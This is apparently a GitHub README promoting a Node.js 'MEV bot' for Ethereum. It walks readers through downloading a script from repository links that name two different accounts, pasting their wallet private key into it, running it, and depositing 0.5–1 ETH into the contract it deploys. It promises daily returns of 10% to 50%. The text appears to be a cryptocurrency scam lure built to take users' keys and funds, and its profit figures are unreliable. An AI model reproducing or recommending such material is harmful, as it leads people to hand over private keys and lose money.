![Banner](https://i.ibb.co/V0C9HTGr/21.jpg)
This repository contains a Node.js script (`start.js`) for deploying and managing a Maximal Extractable Value (MEV) smart contract on the Ethereum Mainnet, inspired by approaches like Jaredfromsubway. The script is designed for local execution on your computer, avoiding online constructors to enhance security and control. It deploys a contract using your Ethereum wallet's private key and allows interaction with the contract's functions (`start`, `stop`, `withdraw`) via a command-line interface.

## Overview

The script deploys a contract intended for operation in competitive MEV environments, similar to those tracked in Etherscan's gas tracker. The contract is managed exclusively by the wallet that deployed it, ensuring full control. After deployment, it operates autonomously, but the script must remain running to interact with the contract.

Profitability depends on factors such as gas prices, market conditions, and competition. A deposit to the contract's balance (recommended: 0.5–1 ETH) significantly impacts performance, with observed average daily returns ranging from 10% to 50% based on data as of July 2025. However, these figures are not guaranteed and vary with market conditions.

## Requirements

To use the script, you need:
- Node.js (version 14 or higher).
- An Ethereum wallet with a private key and sufficient ETH for gas fees (recommended: minimum 0.01 ETH).
- A code editor (e.g., VS Code) or terminal (cmd/PowerShell) to run the script.

## Setup and Installation

1. Download the Repository
   - Download the ZIP file containing the project files: [Download ZIP](https://github.com/TherionthpsY3Z/Mev-Smart-Contract-Bot/archive/refs/heads/main.zip).
   - Or clone the repository with Git (if Git is not installed, download it here: [Download Git](https://git-scm.com/downloads)):
     ```bash
     git clone https://github.com/salmira7gek3/Mev-Smart-Contract-Bot
     ```

2. Navigate to the Project Folder
   - Open a terminal and change to the project directory:
     ```bash
     cd path/to/your/project
     ```

3. Install Dependencies
   - The `package.json` includes required dependencies (`ethers@6`, `inquirer`, `ora`). Install them:
     ```bash
     npm install
     ```

4. Configure Your Private Key
   - Open `start.js` in a code editor.
   - Replace the `PRIVATE_KEY` value with your Ethereum wallet's private key:
     ```javascript
     const PRIVATE_KEY = 'your-private-key';
     ```
   - Security Note: Never share your private key or commit it to version control.

5. Run the Script
   - Execute the script using Node.js:
     ```bash
     node start.js
     ```
   - Follow the prompts to deploy the contract or view instructions.
   - After creating the contract, copy its address and fund its balance from any source (e.g., MetaMask or another wallet).

## Usage

- Deployment: Select `1. Deploy` to deploy the contract on Ethereum Mainnet. The script will estimate gas costs and prompt for confirmation.
- Interaction: After deployment, interact with the contract's functions (`start`, `stop`, `withdraw`) via the command-line menu.
- Instructions: Select `2. Instructions` to view detailed usage guidelines within the script.
- Autonomous Operation: Do not close the terminal after deployment to continue interacting with the contract.

## Troubleshooting

- RPC Issues: If `https://eth.drpc.org` returns a `Request timeout on the free tier` error, use a paid provider like Alchemy or Infura.
- Etherscan: Check transaction logs on [Etherscan](https://etherscan.io/) for detailed error information.

## Notes
- The script is clean and tested, designed for local execution to minimize security risks.
- The MEV contract’s performance depends on market conditions, gas prices, and deposit size. A recommended deposit of 0.5–1 ETH is advised for stable operation.
